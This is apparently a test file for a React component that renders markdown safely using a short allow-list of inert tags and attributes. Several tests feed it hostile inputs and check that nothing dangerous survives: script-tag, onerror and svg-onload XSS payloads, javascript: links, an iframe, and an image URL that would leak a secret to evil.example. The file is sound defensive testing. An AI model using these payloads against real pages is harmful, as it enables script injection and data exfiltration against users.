import test from 'node:test';
import assert from 'node:assert/strict';
import React from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { SafeText, toPlainText, parseSafeText } from '../src/render/SafeText.jsx';
import * as core from '../src/render/safeText.js';

const html = (text, props) => renderToStaticMarkup(React.createElement(SafeText, { text, ...props }));

// Only tags and attributes from this short list may ever appear in the output. Text that merely looks like markup
// is escaped by React (&lt;), so it never forms a tag here.
const TAGS = new Set(['div', 'p', 'h3', 'h4', 'h5', 'ul', 'ol', 'li', 'span', 'strong', 'em', 'code', 'pre', 'blockquote', 'hr', 'br']);
const ATTRIBUTES = new Set(['class', 'data-lang', 'role', 'aria-label', 'start']);

function assertInert(markup) {
  for (const tag of markup.match(/<[^>]*>/g) || []) {
    const name = /^<\/?([a-zA-Z0-9]+)/.exec(tag);
    assert.ok(name && TAGS.has(name[1].toLowerCase()), `unexpected tag ${tag} in: ${markup}`);
    for (const attr of tag.matchAll(/\s([a-zA-Z_:-]+)=/g)) assert.ok(ATTRIBUTES.has(attr[1]), `unexpected attribute ${attr[1]} in: ${markup}`);
  }
  assert.ok(!/<[^>]*\s(href|src|on[a-z]+)\s*=/i.test(markup), 'no link target, source or event handler');
}

test('the component renders structure with ab- classes only', () => {
  const markup = html('# Title\n\nSome **bold**, *italic* and `code`.\n\n- one\n- [x] two\n\n> quote\n\n```js\nlet a;\n```\n\n---');
  assert.match(markup, /^<div class="ab-safe-text">/);
  assert.match(markup, /<h3 class="ab-safe-heading ab-safe-h1">Title<\/h3>/);
  assert.match(markup, /<strong class="ab-safe-bold">bold<\/strong>/);
  assert.match(markup, /<em class="ab-safe-italic">italic<\/em>/);
  assert.match(markup, /<code class="ab-safe-inline-code">code<\/code>/);
  assert.match(markup, /<ul class="ab-safe-list ab-safe-ul">/);
  assert.match(markup, /<li class="ab-safe-item ab-safe-task"><span class="ab-safe-check" role="img" aria-label="Done">/);
  assert.match(markup, /<blockquote class="ab-safe-quote">/);
  assert.match(markup, /<pre class="ab-safe-code" data-lang="js"><code>let a;<\/code><\/pre>/);
  assert.match(markup, /<hr class="ab-safe-rule"\/>/);
  const classes = [...markup.matchAll(/class="([^"]*)"/g)].flatMap((m) => m[1].split(/\s+/));
  assert.ok(classes.length > 10);
  assert.ok(classes.every((c) => c.startsWith('ab-')), classes.filter((c) => !c.startsWith('ab-')).join(','));
  assertInert(markup);
});

test('a host class name is added next to ab-safe-text', () => {
  assert.match(html('hi', { className: 'panel-body' }), /^<div class="ab-safe-text panel-body">/);
});

test('ordered lists keep their start number; line breaks become br', () => {
  const markup = html('4. four\n5. five\n\nline one\nline two');
  assert.match(markup, /<ol class="ab-safe-list ab-safe-ol" start="4">/);
  assert.match(markup, /line one<br\/>line two/);
  assert.ok(!html('1. one').includes('start='));
});

test('html in the text is escaped, never interpreted', () => {
  const evil = '<script>alert(1)</script> <img src=x onerror=alert(1)> <a href="javascript:alert(1)">x</a>';
  const markup = html(evil);
  assertInert(markup);
  assert.ok(markup.includes('&lt;script&gt;alert(1)&lt;/script&gt;'));
  assert.ok(markup.includes('&lt;img src=x onerror=alert(1)&gt;'));
  const inCode = html('```\n<script>alert(1)</script>\n```');
  assertInert(inCode);
  assert.ok(inCode.includes('&lt;script&gt;'));
});

test('a markdown image becomes visible text, no image element and no request address', () => {
  const markup = html('![x](https://evil.example/?q=SECRET)');
  assertInert(markup);
  assert.ok(markup.includes('[image removed: x]'));
  assert.ok(!markup.includes('evil.example'));
  assert.ok(!markup.includes('SECRET'));
});

test('links are shown as text followed by the address, as a span, never an anchor', () => {
  const markup = html('[docs](https://docs.example/a) and [bad](javascript:alert(1)) and https://bare.example/x');
  assertInert(markup);
  assert.ok(markup.includes('docs ('));
  assert.ok(markup.includes('<span class="ab-safe-url">https://docs.example/a</span>'));
  assert.ok(markup.includes('<span class="ab-safe-url">javascript:alert(1)</span>'));
  assert.ok(markup.includes('<span class="ab-safe-url">https://bare.example/x</span>'));
});

test('hostile text renders without any dangerous element or attribute', () => {
  const nasty = [
    '[x](javascript:alert(1))',
    '![x](javascript:alert(1))',
    '<iframe src="https://evil.example"></iframe>',
    '[a](<javascript:alert(1)>)',
    '[a]: javascript:alert(1)\n\n[a]',
    '"><svg onload=alert(1)>',
    '```"><img src=x onerror=alert(1)>\ncode\n```',
    '- <a href="x">y</a>\n- [z](https://e.example)',
    '| a | b |\n|---|---|\n| <img src=x> | y |',
  ];
  for (const text of nasty) assertInert(html(text));
});

test('nested lists, tasks and quotes render as nested elements', () => {
  const markup = html('- a\n  - b\n    - [ ] c\n\n> q1\n>\n> > q2');
  assert.equal((markup.match(/<ul /g) || []).length, 3);
  assert.equal((markup.match(/<blockquote /g) || []).length, 2);
  assert.match(markup, /aria-label="Not done"/);
  assertInert(markup);
});

test('empty and non-string text render an empty container', () => {
  for (const text of ['', null, undefined, 12]) assert.doesNotThrow(() => html(text));
  assert.equal(html(''), '<div class="ab-safe-text"></div>');
});

test('a truncated text shows the notice paragraph', () => {
  const markup = html('abcdef', { maxChars: 3 });
  assert.ok(markup.includes('abc'));
  assert.match(markup, /class="ab-safe-p ab-safe-notice"/);
});

test('toPlainText is available from the component module and matches the core helper', () => {
  assert.equal(toPlainText, core.toPlainText);
  assert.equal(parseSafeText, core.parseSafeText);
  assert.equal(toPlainText(parseSafeText('- a\n- b\n\n**x**')), '- a\n- b\n\nx');
});
